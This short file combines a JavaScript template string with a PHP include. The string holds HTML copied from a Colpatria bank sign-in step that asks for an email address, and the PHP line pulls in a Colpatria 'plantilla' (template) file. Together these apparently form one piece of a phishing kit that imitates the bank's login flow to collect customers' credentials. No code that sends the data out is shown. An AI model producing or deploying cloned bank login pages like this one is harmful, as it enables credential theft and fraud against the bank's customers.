var colpatria_contenido = `
<div class="col-xs-12 block--padding-0 margin-xs-72--bottom">
    <div class="direction--row">
        <div class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0 m-auto">
            <h1 class="hero">Ingresa tu Correo Electrónico</h1>
            <form onsubmit="return false" role="form" autocomplete="off" class="form ng-pristine ng-invalid ng-touched"><!----><!---->
                <div class="form__input margin-xs-30--top">
                    <canvas-input-text formcontrolname="firstCredential" _nghost-hjw-c48="" class="ng-pristine ng-invalid ng-touched" maxlength="12">
                        <div  class="form__input">
                            <label  role="text" class="label" for="inputUserNameId"></label>
                            <div  class="form__input--inline">
                                <input  required class="input input--text ng-pristine ng-valid ng-touched input--with-icon input--with-icon--left input-w-aux__input" id="txtEmail" type="text" placeholder="Correo Electrónico" autocomplete="off" aria-describedby="first-credential-input-error" maxlength="40">
                                <canvas-svg  role="presentation" class="input__icon input__icon--left flex">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                        <path fill="#333" stroke-linecap="round" stroke-width="0.5" stroke-linejoin="round" d="M22.879 22.129a.75.75 0 1 1-1.5 0v-2.39c0-2.212-1.979-4.031-4.449-4.031H6.532c-2.47 0-4.449 1.82-4.449 4.03v2.39a.75.75 0 1 1-1.5 0v-2.39c0-3.069 2.677-5.53 5.95-5.53H16.93c3.272 0 5.949 2.461 5.949 5.53v2.39zm-10.79-10.006a5.77 5.77 0 1 1 0-11.54 5.77 5.77 0 0 1 0 11.54zm0-1.5a4.27 4.27 0 1 0 0-8.54 4.27 4.27 0 0 0 0 8.54z"></path>
                                    </svg>
                                </canvas-svg>
                                <button  type="button" class="button input-w-aux__action">
                                    <canvas-svg  role="presentation" class="flex">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                            <path fill="none" d="M22.667 12c0 5.891-4.776 10.667-10.667 10.667C6.108 22.667 1.333 17.89 1.333 12S6.108 1.333 12 1.333c5.89 0 10.667 4.776 10.667 10.667zM8.647 8.648l6.705 6.704m0-6.704l-6.704 6.704"></path>
                                        </svg>
                                    </canvas-svg>
                                </button>
                            </div>
                        </div>
                    </canvas-input-text>
                    <span id="first-credential-input-error"><!----></span>
                </div>
                <div class="margin-xs-24--top">
                    <canvas-button width="100%">
                        <button class="button button--primary" id="btnEmail" style="width: 100%;">
                            <span>Siguiente</span>
                        </button>
                    </canvas-button>
                </div>
            </form>
        </div>
    </div>
</div>
`
<?php
require_once('_plantilla_colpatria.php');
?>